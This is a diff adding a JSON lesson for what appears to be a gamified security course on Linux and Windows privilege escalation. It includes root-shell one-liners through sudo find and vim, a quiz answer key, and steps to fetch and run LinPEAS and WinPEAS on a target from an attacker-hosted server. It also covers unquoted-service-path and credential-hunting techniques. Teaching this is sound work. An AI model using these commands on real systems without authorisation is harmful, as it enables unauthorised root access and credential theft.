@@ -1,0 +1,123 @@
+{
+    "id": "l3",
+    "chapterId": "ch_11",
+    "title": "Privilege Escalation: Becoming Root/Admin 👑",
+    "description": "Elevate from a low-privilege user to SYSTEM or root.",
+    "xpReward": 45,
+    "estimatedMinutes": 15,
+    "section": "Privilege Escalation",
+    "slides": [
+        {
+            "id": "s_l3_1",
+            "type": "text",
+            "title": "Why Escalate? ⬆️",
+            "content": "# More Power, More Options\n\nA low-privilege shell (`www-data`, `apache`, `IIS APPPOOL`) is **severely restricted**. You often cannot:\n- Read sensitive system files (`/etc/shadow`, SAM hive).\n- Install software or modify system settings.\n- Dump credentials of other users.\n- Access other users' home directories.\n\n**Privilege Escalation** is the act of exploiting a bug, misconfiguration, or design flaw to gain **higher privileges** (root on Linux, SYSTEM or Administrator on Windows).\n\n**Two Types:**\n- **Vertical Escalation**: Low-priv user -> Administrator/root.\n- **Horizontal Escalation**: User A -> User B (different user, same privilege level; often a stepping stone)."
+        },
+        {
+            "id": "s_l3_2",
+            "type": "quiz",
+            "title": "Privilege Escalation Purpose 🧠",
+            "content": "",
+            "quizData": {
+                "id": "q_l3_1",
+                "type": "multiple_choice",
+                "question": "You have a shell as 'bob', a standard domain user. You use a technique to access files owned by 'alice' without changing privilege levels. This is an example of:",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "Vertical Privilege Escalation",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "Horizontal Privilege Escalation",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "Persistence",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt4",
+                        "text": "Pivoting",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "Horizontal movement gains access to another account at the same level, often due to misconfigured permissions.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l3_3",
+            "type": "text",
+            "title": "Linux Privilege Escalation Vectors 🐧",
+            "content": "# The Path to Root\n\n**1. SUDO Misconfigurations**\nCheck what commands you can run as root without a password:\n```bash\nsudo -l\n```\nIf you see `(ALL) NOPASSWD: /usr/bin/find`, you can spawn a root shell:\n```bash\nsudo find . -exec /bin/sh \\; -quit\n```\n\n**2. SUID Binaries**\nFind files with the SUID bit set (run as owner, usually root):\n```bash\nfind / -perm -u=s -type f 2>/dev/null\n```\nCommon exploitable SUIDs: `find`, `vim`, `python`, `systemctl`.\n\n**3. Writable Cron Jobs**\nCheck for system cron jobs that run scripts writable by you.\n```bash\ncat /etc/crontab\nls -la /etc/cron.d/\n```\n\n**4. Kernel Exploits**\nOld, unpatched kernels are vulnerable to local privilege escalation exploits.\n```bash\nuname -a\nsearchsploit linux kernel 3.13\n```\n*(Use with extreme caution; kernel exploits can crash the system).*"
+        },
+        {
+            "id": "s_l3_4",
+            "type": "code",
+            "title": "Linux PrivEsc: LinPEAS 🛠️",
+            "content": "Manual enumeration takes time. **LinPEAS** automates the search for misconfigurations.",
+            "codeSnippet": "# On Kali: Host LinPEAS\nwget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh\npython3 -m http.server 8000\n\n# On Target (low-priv shell)\ncd /tmp\nwget http://192.168.56.102:8000/linpeas.sh\nchmod +x linpeas.sh\n./linpeas.sh | tee linpeas_output.txt",
+            "codeLanguage": "bash",
+            "canRunCode": false
+        },
+        {
+            "id": "s_l3_5",
+            "type": "text",
+            "title": "Windows Privilege Escalation Vectors 🪟",
+            "content": "# Becoming SYSTEM\n\n**1. Unquoted Service Paths**\nIf a service binary path contains spaces and is not quoted (e.g., `C:\\Program Files\\My App\\app.exe`), Windows tries to execute `C:\\Program.exe` if it exists. Place a malicious `Program.exe` there.\n\n**2. AlwaysInstallElevated**\nIf the registry keys `AlwaysInstallElevated` are set to `1`, any user can install a malicious `.msi` package with SYSTEM privileges.\n```cmd\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n```\n\n**3. SeImpersonatePrivilege (Potato Attacks)**\nIf your token has `SeImpersonatePrivilege`, you can use **JuicyPotato** or **PrintSpoofer** to impersonate SYSTEM.\n```cmd\nwhoami /priv\n```\n\n**4. Saved Credentials**\n- **Credential Manager**: `cmdkey /list`\n- **Unattended Install Files**: `C:\\Windows\\Panther\\Unattend.xml` (may contain admin passwords).\n- **PowerShell History**: `(Get-PSReadlineOption).HistorySavePath`"
+        },
+        {
+            "id": "s_l3_6",
+            "type": "code",
+            "title": "Windows PrivEsc: WinPEAS 🛠️",
+            "content": "The Windows equivalent of LinPEAS.",
+            "codeSnippet": "# On Kali\nwget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe\npython3 -m http.server 8000\n\n# On Target (PowerShell)\ncd C:\\Users\\Public\nInvoke-WebRequest -Uri http://192.168.56.102:8000/winPEASx64.exe -OutFile winPEAS.exe\n.\\winPEAS.exe",
+            "codeLanguage": "powershell",
+            "canRunCode": false
+        },
+        {
+            "id": "s_l3_7",
+            "type": "quiz",
+            "title": "PrivEsc Vectors 🧠",
+            "content": "",
+            "quizData": {
+                "id": "q_l3_2",
+                "type": "multiple_choice",
+                "question": "You run `sudo -l` and see `(root) NOPASSWD: /usr/bin/vim`. How can you get a root shell?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "sudo vim -c '!sh'",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "vim /etc/shadow",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "sudo vim /etc/passwd",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt4",
+                        "text": "You cannot get a shell from vim.",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "Vim can execute shell commands via `:!sh`. If you run vim with sudo, that shell will be root.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l3_8",
+            "type": "warning",
+            "title": "Kernel Exploit Caution 💀",
+            "content": "## Blue Screen of Death (BSOD)\n\nKernel exploits modify the core of the operating system. A slight mismatch in versions can cause an **immediate crash** (BSOD on Windows, Kernel Panic on Linux). In a production environment, **never run a kernel exploit** without explicit permission and a maintenance window."
+        }
+    ]
+}
